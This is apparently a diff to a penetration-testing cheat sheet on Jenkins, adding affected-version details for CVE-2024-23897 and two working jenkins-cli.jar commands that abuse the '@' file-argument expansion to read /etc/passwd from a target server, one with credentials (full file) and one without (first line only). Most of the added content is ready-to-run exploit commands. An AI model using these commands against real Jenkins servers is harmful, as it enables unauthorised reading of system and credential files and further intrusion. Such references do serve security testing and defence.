@@ -2,12 +2,18 @@
 
 Remote Code Execution
 =====================
-Jenkins CLI arbitrary read (CVE-2024-23897)
+Jenkins CLI arbitrary read (CVE-2024-23897 applies to versions below 2.442 and LTS 2.426.3)
 -------------------------------------------
 [Jenkins Advisory](https://www.jenkins.io/security/advisory/2024-01-24/)
 
+Authenticated, can retrieve a complete file:
 ```
 java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins -auth abc:abc connect-node "@/etc/passwd"
+```
+
+Unauthenticated or missing Global/Read permissions, can only read 1 line:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins who-am-i "@/etc/passwd"
 ```
 
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
